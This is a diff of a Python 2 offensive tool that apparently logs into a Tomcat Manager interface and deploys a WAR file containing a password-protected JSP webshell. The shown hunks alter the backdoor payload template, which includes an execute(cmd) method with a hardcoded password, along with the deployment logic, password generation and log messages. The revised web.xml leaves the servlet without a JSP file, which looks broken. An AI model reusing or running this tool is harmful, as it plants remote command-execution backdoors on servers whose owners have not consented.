@@ -31,9 +31,9 @@ import tempfile
 import shutil
 import re
 import base64
-from BeautifulSoup import BeautifulSoup
 import logging
 import commands
+from BeautifulSoup import BeautifulSoup
 
 logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
 logging.addLevelName( logging.WARNING, "\033[1;31m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
@@ -49,7 +49,7 @@ def generateWAR(code, title, appname):
     os.makedirs(dirpath + '/files/META-INF')
     os.makedirs(dirpath + '/files/WEB-INF')
     
-    with open(dirpath + '/%s.jsp' % appname, 'w') as f:
+    with open(dirpath + '/index.jsp', 'w') as f:
         f.write(code)
 
     javaver = commands.getstatusoutput('java -version')[1]
@@ -63,20 +63,31 @@ def generateWAR(code, title, appname):
 
     with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
         f.write('''Manifest-Version: 1.0
-Created-By: %s
+Created-By: %s (Sun Microsystems Inc.)
 
 ''' % javaver)
 
     logging.info('Generating web.xml with servlet-name: "%s"' % title)
     with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
-        f.write('''<?xml version="1.0" ?>
-<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
+        f.write('''<?xml version="1.0" encoding="ISO-8859-1"?>
+<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
+    version="2.4">
+
+    <display-name>%s</display-name>
+
     <servlet>
         <servlet-name>%s</servlet-name>
-        <jsp-file>/%s.jsp</jsp-file>
     </servlet>
+
+    <servlet-mapping>
+        <servlet-name>%s</servlet-name>
+        <url-pattern>/%s</url-pattern>
+    </servlet-mapping>
+
 </web-app>
-''' % (title, appname))
+''' % (title, appname.capitalize(), appname.capitalize(), appname))
 
     cwd = os.getcwd()
     os.chdir(dirpath)
@@ -102,7 +113,8 @@ def preparePayload(opts):
     else:
         passwordField = ''
 
-    payload = '''
+    logging.warning('JSP Backdoor password set to: >>> "%s" <<<' % opts.shellpass)
+    payload = '''<%%@ page import="java.util.*,java.io.*"%%>
 <%%!
     public String execute(String cmd) {
         final String hardcodedPass = "%(password)s";
@@ -153,8 +165,7 @@ def preparePayload(opts):
         </pre>
         <br />
     </body>
-</html>
-''' % {'title': opts.title, 'password2': passwordField, 'password': opts.shellpass }
+</html>''' % {'title': opts.title, 'password2': passwordField, 'password': opts.shellpass }
 
     return payload
 
@@ -261,8 +272,8 @@ def browseToManager(url, user, password):
 
     return browser
 
-def generateRandomPassword(N=8):
-    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(N))
+def generateRandomPassword(N=12):
+    return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(N))
 
 def options():
     print '''
@@ -336,7 +347,7 @@ def main():
             warpath = opts.file
 
         if checkIsDeployed(browser, url, opts.appname):
-            logging.info('Application with name: "%s" is already deployed.' % opts.appname)
+            logging.warning('Application with name: "%s" is already deployed.' % opts.appname)
             if opts.unload:
                 logging.info('Unloading existing one...')
                 if unloadApplication(browser, args[0], opts.appname):
@@ -345,8 +356,8 @@ def main():
                     logging.info('Unloading failed.')
                     return
             else:
-                logging.error('Not continuing until the application name is changed or current one unloaded.')
-                logging.error('Please use -u (--unload) option to force current application unloading.')
+                logging.warning('Not continuing until the application name is changed or current one unloaded.')
+                logging.warning('Please use -x (--unload) option to force existing application unloading.')
                 return
         else:
             logging.info('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
